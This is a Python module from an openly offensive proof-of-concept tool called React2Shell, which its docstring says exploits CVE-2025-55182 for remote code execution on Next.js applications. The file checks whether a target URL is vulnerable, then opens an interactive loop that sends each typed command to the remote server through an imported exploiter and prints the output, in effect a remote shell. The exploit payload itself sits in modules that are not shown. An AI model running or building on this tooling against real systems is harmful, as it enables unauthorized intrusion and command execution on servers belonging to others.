"""
React2Shell - CVE-2025-55182 PoC Tool
Developed by @BlackTechX011

Exploits prototype pollution in React Flight Protocol deserialization
to achieve Remote Code Execution on vulnerable Next.js applications.
"""
from react2shell.utils.config import Config
from react2shell.core.exploiter import Exploiter
from react2shell.core.scanner import Scanner
from react2shell.ui.console import console
from rich.prompt import Prompt

def run_shell(config: Config):
    if not config.url:
        console.print("[error][!] No target URL provided for shell mode.[/error]")
        return

    from react2shell.utils.helpers import normalize_url
    target = normalize_url(config.url)
    
    console.print(f"[info][*] Verifying vulnerability on {target}...[/info]")
    scanner = Scanner(config)
    res = scanner.scan_target(target)
    
    if not res["vulnerable"]:
        console.print("[error][!] Target does not appear vulnerable. Aborting shell.[/error]")
        return
    
    console.print(f"[success][+][/success] Target is vulnerable! Interactive shell ready.")
    console.print("[dim]Type 'exit' or 'quit' to close the shell.[/dim]\n")
    
    exploiter = Exploiter(config)
    
    while True:
        try:
            cmd = Prompt.ask(f"[bold red]React2Shell[/bold red]@[bold cyan]{target.replace('https://','').replace('http://','')}[/bold cyan] [white]$ [/white]")
            
            if cmd.lower() in ["exit", "quit"]:
                break
            
            if not cmd.strip():
                continue
                
            output = exploiter.execute_command(target, cmd)
            console.print(output)
            
        except KeyboardInterrupt:
            console.print("\n[info][*] Exiting shell...[/info]")
            break
        except Exception as e:
            console.print(f"[error][!] Error: {e}[/error]")
